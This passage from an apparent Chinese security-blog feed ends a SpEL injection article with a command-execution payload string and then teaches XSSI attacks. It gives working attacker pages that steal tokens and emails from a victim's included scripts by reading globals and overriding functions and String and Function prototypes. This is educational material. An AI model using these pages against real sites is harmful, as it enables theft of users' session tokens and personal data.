title="防御方法"></a>防御方法</h3><p>最直接的修复方法是使用SimpleEvaluationContext替换StandardEvaluationContext。</p><p>官方文档：<a href="https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html" target="_blank" rel="noopener">https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html</a></p><p>Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String spel = <span class="string">"T(java.lang.Runtime).getRuntime().exec(\"calc\")"</span>;</span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Student student = <span class="keyword">new</span> Student();</span><br><span class="line">EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(student).build();</span><br><span class="line">Expression expression = parser.parseExpression(spel);</span><br><span class="line">System.out.println(expression.getValue(context));</span><br></pre></td></tr></table></figure><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="http://rui0.cn/archives/1043" target="_blank" rel="noopener">由浅入深SpEL表达式注入漏洞</a></p><p><a href="https://mrbird.cc/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F.html" target="_blank" rel="noopener">SpEL表达式</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="SpEL注入" scheme="https://www.mi1k7ea.com/tags/SpEL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析XSSI漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/01/04/%E6%B5%85%E6%9E%90XSSI%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/01/04/浅析XSSI漏洞/</id>
    <published>2020-01-04T02:24:56.000Z</published>
    <updated>2020-01-07T16:16:31.718Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>XSSI漏洞是个老东西了，最近看了下有点新东西，就记下笔记。</p><p>为了有效防御XSS，业界推出了CSP即内容安全策略，即使用白名单机制，对网站加载或执行的资源进行安全策略的控制。这种情形下，除非CSP配置存在问题，不然XSS一般是难以再被深入挖掘利用了。</p><p>但在某些场景中，开发者看你们会将敏感信息存放在某些文件中，当无法对XSS进行利用时，此时就可以尝试挖掘下是否存在XSSI漏洞。</p><h2 id="0x01-XSSI原理"><a href="#0x01-XSSI原理" class="headerlink" title="0x01 XSSI原理"></a>0x01 XSSI原理</h2><p>XSSI（全称Cross Site Script Inclusion）跨站脚本包含，是一种通过嵌入script标签的src属性来加载外部数据来实现绕过边界窃取敏感信息的漏洞。</p><p>例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- attacker's page loads external data with SCRIPT tag --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">src</span>=<span class="string">"http://target.wooyun.org/secret"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure><p>XSSI的核心原理就是绕过SOP（同源策略）来跨域包含含有敏感信息的外域文件。我们知道，script标签是允许跨域加载资源的，如果某个网站的动态脚本、文件或响应中包含某些敏感信息（比如唯一标识符、个人资料、防御CSRF的Token），便有信息泄露的风险。XSSI就是利用的script标签允许跨域加载资源的特性来实现跨域包含资源的，这正是通过JSONP的技术来实现的。注意，大多数的XSSI都是针对动态JS文件进行攻击利用的。</p><blockquote><p>传统的XSSI攻击场景如下：恶意页面B使用script标签包含了目标网站A用来储存敏感数据的信息源C（可能是动态脚本、文件或响应），当攻击者引导受害者访问B时，由于受害者此时在A处于登录态，B可以轻松获取C中包含的受害者的敏感信息。 </p></blockquote><p>如图：</p><p><img src="/2020/01/04/浅析XSSI漏洞/22.png" alt=""></p><h2 id="0x02-XSSI与XSS、CSRF的区别"><a href="#0x02-XSSI与XSS、CSRF的区别" class="headerlink" title="0x02 XSSI与XSS、CSRF的区别"></a>0x02 XSSI与XSS、CSRF的区别</h2><p>相同点：三者均为Web前端安全漏洞，即针对客户端攻击的漏洞。</p><p>不同点：</p><ul><li>XSS是在受害者页面中注入恶意代码执行恶意操作，例如窃取已登录用户的cookie信息；</li><li>CSRF是通过诱使受害者访问恶意页面导致向目标页面发起请求，在受害者已登录的目标页面中执行恶意动作，例如提交修改用户密码的表单操作；</li><li>XSSI是通过script标签的src属性来跨域包含含有敏感数据的文件来窃取敏感信息的；</li></ul><h2 id="0x03-XSSI攻击利用"><a href="#0x03-XSSI攻击利用" class="headerlink" title="0x03 XSSI攻击利用"></a>0x03 XSSI攻击利用</h2><p>XSSI的攻击利用根据包含敏感信息的目标文件类型主要分两种场景，即JS文件和其他文件。这里JS文件的攻击利用最为简单直接，因为JS文件其内容本身就是JS代码，加载到script标签中刚好符合JS格式语法；而其他类型的文件的利用相比之下较为复杂。</p><p>我们可以对XSSI的攻击利用进行个简单的分类：</p><ul><li>针对JavaScript类型文件<ul><li>静态的JavaScript文件</li><li>静态的JavaScript文件，但仅在认证后可访问</li><li>动态的JavaScript文件</li></ul></li><li>针对非JavaScript类型文件<ul><li>CSV文件</li><li>JSON文件/响应</li></ul></li></ul><h3 id="针对JavaScript类型文件"><a href="#针对JavaScript类型文件" class="headerlink" title="针对JavaScript类型文件"></a>针对JavaScript类型文件</h3><p>在某些JS文件中，可能会保存着一些敏感信息。当然，静态和动态的JS文件它们之间的利用是存在区别的。</p><h4 id="窃取JS全局变量的值"><a href="#窃取JS全局变量的值" class="headerlink" title="窃取JS全局变量的值"></a>窃取JS全局变量的值</h4><p>这里假设目标服务端存在静态的secret.js文件，里面保存着token敏感信息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> token = <span class="string">"mi1k7ea_token_192ufh189u2erjsjoif189u"</span>;</span><br></pre></td></tr></table></figure><p>攻击者编写的xssi.html文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"leaked_content"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.130:81/secret.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"jquery-3.3.1"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">$(<span class="string">'#leaked_content'</span>).text(token);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>改文件即XSSI的攻击实现。通过script标签的src属性来跨域加载目标服务端的secret.js文件进来，然后将窃取到的token信息显示在页面上：</p><p><img src="/2020/01/04/浅析XSSI漏洞/1.png" alt=""></p><p>当然，这只是个模拟的简单的不行的演示。因为这个JS文件时静态的，直接访问都是可以的，此时利用XSSI进行攻击都是多此一举的。<strong>一般的，XSSI是针对动态的JS文件来攻击利用的</strong>，这是因为动态的JS文件通常在用户处于登录态时容易包含敏感信息。</p><blockquote><p>那么如何快速分辨一个JS文件是否为动态JS文件？——当有Cookie和无Cookie时请求所响应的文件内容不同时，即可确定这是一个动态JS文件了，当然并不是每一个动态JS文件都可以被利用。</p><p>我们可以使用Burpsuite的插件DetectDynamicJS来完成这项工作，此插件已在github上开源，链接地址：<a href="https://github.com/portswigger/detect-dynamic-js" target="_blank" rel="noopener">https://github.com/portswigger/detect-dynamic-js</a></p></blockquote><p>前面的敏感信息是保存在JS文件的全局变量中，获取的时候直接读取该全局变量的值即可，十分方便。下面看下敏感信息保存在JS文件的局部变量中如何来获取。</p><h4 id="重写函数窃取数据"><a href="#重写函数窃取数据" class="headerlink" title="重写函数窃取数据"></a>重写函数窃取数据</h4><p>一般情况下，网站都会将一些基本的功能函数写入一个JS文件中，以便后面的各项业务中能够很方便地重用这个功能函数。</p><h5 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h5><p>这里假设目标服务端含有敏感token信息的动态JS文件，getToken()函数中的session是动态获取的，此时敏感信息保存在局部变量中，并且调用doSomeThing()函数对该敏感信息进行处理：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> token = getToken();</span><br><span class="line">doSomeThing(token);</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getToken</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">len = <span class="number">16</span> || <span class="number">32</span>;</span><br><span class="line"><span class="keyword">var</span> $chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678'</span>;</span><br><span class="line"><span class="keyword">var</span> maxPos = $chars.length;</span><br><span class="line"><span class="keyword">var</span> pwd = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">pwd += $chars.charAt(<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * maxPos));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> pwd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XSSI利用页面，此时没法像前面那样直接通过全局变量就获取到敏感数据，因为这里敏感数据是保存在局部变量中的，并且调用了doSomeThing()方法对该变量进行处理，因此这里通过重写doSomeThing()函数来窃取token数据：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.data = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">doSomeThing</span><span class="params">(d)</span></span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.data = d;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"leaked_content"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.130:81/secret.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"jquery-3.3.1"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">$(<span class="string">'#leaked_content'</span>).text(<span class="built_in">window</span>.data);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时就能成功窃取到敏感信息token了，这是因为将目标服务端的JS文件加载进来后，在调用doSomeThing()函数处理敏感数据时，是直接调用的恶意页面上实现的doSomeThing()函数，从而执行了攻击者自己编写的doSomeThing()函数的代码被窃取到了数据：</p><p><img src="/2020/01/04/浅析XSSI漏洞/2.png" alt=""></p><h5 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h5><p>secret.js，这次传递给函数的数据是一个包含了我们想要的数据的回调函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> email = <span class="string">"123@123.com"</span>;</span><br><span class="line">&#125;</span><br><span class="line">doSomeThing(callback);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>xssi.html，攻击者可以通过使用toString方法来获得回调函数中的这些数据：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.data = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">doSomeThing</span><span class="params">(callback)</span></span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.data = callback.toString();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"leaked_content"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/secret.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"jquery-3.3.1"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">$(<span class="string">'#leaked_content'</span>).text(<span class="built_in">window</span>.data);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里就能获取到包括敏感信息在内的整个回调函数的内容：</p><p><img src="/2020/01/04/浅析XSSI漏洞/23.png" alt=""></p><p>如果想精准输出内容，可用正则：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.data = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">doSomeThing</span><span class="params">(callback)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> content = callback.toString();</span></span><br><span class="line"><span class="actionscript">window.data = /<span class="keyword">var</span>.*<span class="string">"(.*)"</span>/g.exec(content)[<span class="number">1</span>];</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="重写原型链窃取数据"><a href="#重写原型链窃取数据" class="headerlink" title="重写原型链窃取数据"></a>重写原型链窃取数据</h4><p>如果目标JS文件中并未调用相应的函数对敏感数据进行处理，换句话说，就是我们没办法重写函数来窃取敏感数据，此时我们可以考虑通过重写原型链来实现。这种方式的关键点在于，JS中调用了敏感数据所属类型的内置方法，比如String类型的内置方法split()/trim()/search()…等。</p><h5 id="Demo1-1"><a href="#Demo1-1" class="headerlink" title="Demo1"></a>Demo1</h5><p>这里假设目标服务端含有敏感token信息的动态JS文件，getToken()函数中的session是动态获取的，此时敏感信息保存在局部变量中，和前一小节的区别在于，并未调用函数对敏感数据进行处理，而是调用了String类型的内置方法trim()来处理该敏感数据：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> token = getToken();</span><br><span class="line"><span class="keyword">var</span> t = token.trim();</span><br><span class="line">&#125;</span><br><span class="line">setInfo();</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getToken</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">len = <span class="number">16</span> || <span class="number">32</span>;</span><br><span class="line"><span class="keyword">var</span> $chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678'</span>;</span><br><span class="line"><span class="keyword">var</span> maxPos = $chars.length;</span><br><span class="line"><span class="keyword">var</span> pwd = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">pwd += $chars.charAt(<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * maxPos));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> pwd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XSSI利用页面，重写String类型的内置方法trim()的原型链来实现窃取敏感数据，这是由于token是String类型的，在调用trim()方法时会调用String原型链中的trim()方法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.data = <span class="string">''</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">String</span>.prototype.trim = <span class="function"><span class="keyword">function</span>(<span class="params">param</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.data = <span class="keyword">this</span>.toString();</span></span><br><span class="line"><span class="actionscript"><span class="keyword">return</span> [<span class="literal">null</span>, <span class="keyword">this</span>];</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"leaked_content"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.130:81/secret.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"jquery-3.3.1"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">$(<span class="string">'#leaked_content'</span>).text(<span class="built_in">window</span>.data);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时能够成功窃取到数据：</p><p><img src="/2020/01/04/浅析XSSI漏洞/3.png" alt=""></p><h5 id="原型链分析"><a href="#原型链分析" class="headerlink" title="原型链分析"></a>原型链分析</h5><p>我们到浏览器的Console试下就知道。先看下String类型的原型链确实存在trim()这个内置函数，当然，如果含有敏感信息的String类型的局部变量调用了其他如下列出的内置方法我们都可以直接同理利用：</p><p><img src="/2020/01/04/浅析XSSI漏洞/4.png" alt=""></p><p>接着看下trim()内置方法的实现：</p><p><img src="/2020/01/04/浅析XSSI漏洞/5.png" alt=""></p><p>OK，现在我们知道目标JS中该String类型变量会调用trim()方法，那么我们就可以通过在我们的恶意页面来污染String原型链的trim()方法为我们自定义实现的方法，从而来窃取数据：</p><p><img src="/2020/01/04/浅析XSSI漏洞/6.png" alt=""></p><h5 id="Demo2-1"><a href="#Demo2-1" class="headerlink" title="Demo2"></a>Demo2</h5><p>较Demo1，使用了一个函数和toString方法。</p><p>secret.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> func = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> emails = [<span class="string">"123@123.com"</span>, <span class="string">"456@456.com"</span>];</span><br><span class="line">&#125;</span><br><span class="line">func.call();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>xssi.html，通过prototype将所有Functiorn的call方法重写，然后再调用.toString()方法将函数转换为字符串类型再读取内容，最后再引入产生数据泄露的脚本文件执行：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span 